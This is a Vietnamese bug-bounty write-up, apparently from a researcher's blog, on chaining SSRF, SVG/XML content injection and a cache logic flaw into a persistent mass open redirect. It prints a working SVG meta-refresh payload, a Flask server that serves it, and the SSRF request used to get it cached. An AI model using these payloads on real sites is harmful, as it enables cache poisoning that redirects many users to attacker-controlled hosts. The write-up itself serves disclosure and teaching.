---
date: 2025-08-14 10:15:00 AM
---

# SSRF-induced Cache Poisoning Logic Bug Flaw

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

## **TL;DR** 
Lỗ hổng SSRF ban đầu bị đánh giá thấp (P5) do có bộ lọc chặn truy cập tài nguyên nội bộ. Tuy nhiên, khi kết hợp với một lỗi logic trong cơ chế xử lý Cache của Server (lưu Cache 1 năm sau 3 lần gọi), kẻ tấn công đã lợi dụng **XML Injection** để chèn nội dung độc hại (một tệp SVG chứa thẻ meta HTML chuyển hướng) vào bộ nhớ Cache. Điều này dẫn đến một cuộc tấn công **Open Redirect** hàng loạt, cho thấy lỗ hổng tưởng chừng vô hại lại có thể trở nên rất nguy hiểm khi kết hợp với lỗi logic của ứng dụng.

### **Tóm tắt chuỗi lỗ hổng (Vulnerability Chain)**
- SSRF (Server-Side Request Forgery): Lợi dụng chức năng Proxy Controller để buộc server tương tác với dịch vụ bên ngoài.

- XML Injection: Sử dụng file SVG (định dạng XML) để chèn nội dung HTML độc hại vào phản hồi của server.

- Variant Cache Poisoning: Tận dụng lỗi logic của server để lưu vĩnh viễn nội dung độc hại đã được chèn vào bộ nhớ cache, từ đó tấn công hàng loạt người dùng.

---
## 1. Lỗ Hổng Server-Side Request Forgery(SSRF) Dẫn Đến Variant Cache Poisoning

Lỗ hổng Server-Side Request Forgery (SSRF) được phát hiện trong tham số `url` với chức năng [Proxy Controller](https://inappwebview.dev/docs/webview/proxy-controller/). Nguyên nhân là do ứng dụng thiếu cơ chế xác thực và ủy quyền hiệu quả, cho phép bất kỳ người dùng nào cũng có thể sử dụng chức năng này.

Kẻ tấn công có thể lợi dụng lỗ hổng bằng cách cung cấp một domain tùy ý `(attacker domain)`, buộc máy chủ phải tương tác với các dịch vụ bên ngoài. Tuy nhiên, lỗ hổng này không thể được khai thác để truy cập các tài nguyên nội bộ của máy chủ (như localhost) do ứng dụng đã có bộ lọc `(filter)`.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/0.jpg)

Vì lý do không thể gọi tài nguyên nội bộ của máy chủ (localhost) nên `Bugcrowd` đã hạ mức độ nghiêm trọng của lỗ hổng xuống `P5 (Informational)`, chỉ mang tính chất thông tin thay vì là một rủi ro bảo mật nghiêm trọng.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/2.png)

---
## 2. Lỗ Hổng Variant Cache Poisoning

Lỗ hổng Variant Cache Poisoning được phát hiện qua phản hồi của server. Các header như `X-Cache: Hit from CloudFront` và `Age: 5` cùng với `Status 200 OK` cho thấy server đang sử dụng CDN (Content Delivery Network) và nội dung đang được cache.

Ban đầu, khi thử thay đổi `Content-Type` trong header của server độc hại thành `text/html`, server trả về `Status 400 Bad Request` vì không chấp nhận loại nội dung này.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/4.jpg)

Tuy nhiên, khi chuyển sang sử dụng `Content-Type: image/svg+xml`, server đã phản hồi với `Status 200 OK`. Điều này chứng tỏ server chấp nhận và xử lý thành công loại nội dung này, mở ra khả năng khai thác lỗ hổng.

Kết quả là, tôi đã tấn công **Variant Cache Poisoning** thành công. Lỗ hổng này đặc biệt nguy hiểm vì nó cho phép tôi thực hiện một cuộc tấn công **XML Injection** để chèn nội dung HTML độc hại vào file SVG. Mã HTML này sau đó được lưu vào bộ nhớ cache, tạo tiền đề cho các cuộc tấn công tiếp theo.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/3.jpg)

Sau khi nghiên cứu sâu hơn, tôi nhận thấy đây không phải là một lỗ hổng `Cache Poisoning` thông thường. Nó mang tính chất của một `Logic Bug Flaw`.

Cụ thể, Server được lập trình để chỉ cho phép gửi yêu cầu đến một Endpoint tối đa 3 lần. Sau 3 lần đó, cache sẽ được lưu lại 1 năm. Khi người dùng khác truy cập vào Endpoint này, Server sẽ luôn phục vụ nội dung độc hại đã được lưu từ trước, thay vì xử lý yêu cầu mới. Đây chính là điểm yếu trong Logic của ứng dụng, không phải là một lỗi cấu hình đơn thuần, vì vậy tôi sẽ gọi nó là **Variant Cache Poisoning** cho hợp lý và tránh gây tranh cãi hoặc hiểu nhầm lỗ hổng với 1 số người đọc không hết bài viết vì quá dài.

Lưu ý: Tôi đã sử dụng công cụ [requestrepo.com](https://requestrepo.com/) để chỉnh sửa các header trong quá trình thử nghiệm.
![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/5.png)

---
## 3. Tác Động và Kịch Bản Tấn Công (Impact & Attack Scenario)

### Tác Động (Impact)

Mặc dù lỗ hổng `Variant Cache Poisoning` cho phép kẻ tấn công chèn nội dung độc hại vào bộ nhớ `cache`, nhưng việc khai thác trực tiếp để thực hiện `XSS Stored` đã bị chặn bởi chính sách bảo mật nội dung `CSP (Content Security Policy)` của hệ thống. Vì vậy, tôi đã chuyển hướng nghiên cứu để tìm một kịch bản tấn công khác khả thi hơn.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/8.png)

Sau khi phân tích, tôi nhận thấy có thể tận dụng khả năng chèn nội dung HTML để gây ra tấn công `Chuyển Hướng Mở (Open Redirect)` bằng cách sử dụng `meta tag`.

### Kịch Bản Tấn Công (Attack Scenario)

Để chứng minh kịch bản này, tôi đã thiết lập một máy chủ độc hại để lưu lại nhật ký truy cập (log).

Tôi đã tạo một file poc.xml trên máy chủ độc hại với nội dung sau:

`poc.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/" />
    </body>
  </foreignObject>
</svg>
```

File này thực chất là một `SVG (một dạng XML)` có chứa thẻ `<foreignObject>`, cho phép nhúng nội dung HTML. Nhờ `namespace http://www.w3.org/1999/xhtml`, thẻ `<meta http-equiv="refresh">` sẽ được trình duyệt của người dùng xử lý, buộc họ tự động chuyển hướng đến một URL do kẻ tấn công chỉ định.

### Quá trình khai thác:

1. Tôi đã thiết lập máy chủ độc hại bằng Flask để phục vụ file `poc.xml` với `header Content-Type: image/svg+xml`. 
```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    else:
        return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5505)
```

2. Sử dụng `Burp Suite Repeater`, tôi lợi dụng lỗ hổng `SSRF` bằng cách cung cấp địa chỉ của máy chủ độc hại `(http://{ip}:{port}/poc.xml) `vào tham số `u`.
```http
GET /media?u=http://Ip-Demo:5505/poc.xml HTTP/2 
Host: VulnWeb-demo.com 
Cookie: None
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Windows" Accept-Language: en-US,en;q=0.9 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 
Sec-Fetch-Dest: document 
Accept-Encoding: gzip, deflate, br 
Priority: u=0, i
```

3. Khi server dễ bị tổn thương `(VulnWeb-demo.com)` thực hiện yêu cầu, nó sẽ lấy toàn bộ nội dung từ `file poc.xml` của tôi và lưu vào `cache`.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/6.jpg)

4. Kết quả là, server đã trả về nội dung độc hại từ máy chủ của tôi.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

## 4. Flow diagram

### Một số lưu ý về lỗ hổng
Lỗ hổng này có thể dẫn đến tấn công Open Redirect, nghe có vẻ low-impact, nhưng vấn đề nằm ở chỗ payload có thể được lưu vĩnh viễn trong cache. Điều này khiến mỗi khi người dùng truy cập vào endpoint đó, họ đều bị chuyển hướng, tạo ra một cuộc tấn công hàng loạt.

![alt text](https://mermaid.ink/img/pako:eNp9km9vmzAQxr-KdVPe0SzkH5QXkxKyptpSaWqidBr0hQMXsGpsZsyUNOK7z5i2o9M0v7rz73nuTj5fIJEpQgCDwYUJpgNyiQUhMegcC4whMGGKR1pzHYPTQ3uqGD1wrFqN9bToKIXesucXozsvTy-uV_iALMt1hw-Spz2s8aRDyaXq6IeRPT0BZwL_K8A0ww09IF_S5ClTshamfmCUR3tiaIVNLJpmMIhFpmiZk819e7mI9izZseKRXF19Il-ie_xZY6W7dBmFXNbpjTLzP7bqz9FCa9MCVSf4Gt1RzhIm64q8c4atetmF0RbVL1RkX3OBih4YZ_psy4Vdlz_hKvqm5OlMblAnOVlRTa1uZeFtr1lX0sJbC9c9GJpxUWiy3a8_fr_bWNX677F270avSikqtMqdxQtwIFMshUCrGh0oUBW0TeEf34Sqp_aJG-MpqfghZfFqM6vIcgiOlFcmq8uUalwxajZQvN0qFCmq0CxNQzB1fVsEggucIPDd4dz3pvPpyJt57rU7c-AMwWQ8Hk7nnjsZ-7OJe-15jQPPtuto6Huz5jcMZeBn)

## 5. Link Tham Khảo:

[https://www.w3.org/TR/SVG11/](https://www.w3.org/TR/SVG11/)

[https://www.w3.org/TR/xhtml1/](https://www.w3.org/TR/xhtml1/)

[https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg)

[https://owasp.org/www-community/attacks/Server_Side_Request_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)


## 6. Proof-of-Concept (POC) - Video

![](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/video.gif)

## 7. Kết Luận
Qua lỗ hổng này, chúng ta có thể thấy rằng một lỗ hổng tưởng chừng có mức độ nghiêm trọng thấp (P5) ban đầu lại có thể trở nên nguy hiểm hơn khi được kết hợp với một lỗi logic trong ứng dụng. Điều này nhấn mạnh tầm quan trọng của việc không chỉ tìm thấy lỗ hổng mà còn phải phân tích kỹ lưỡng cơ chế hoạt động của chúng để đánh giá đúng mức độ rủi ro.



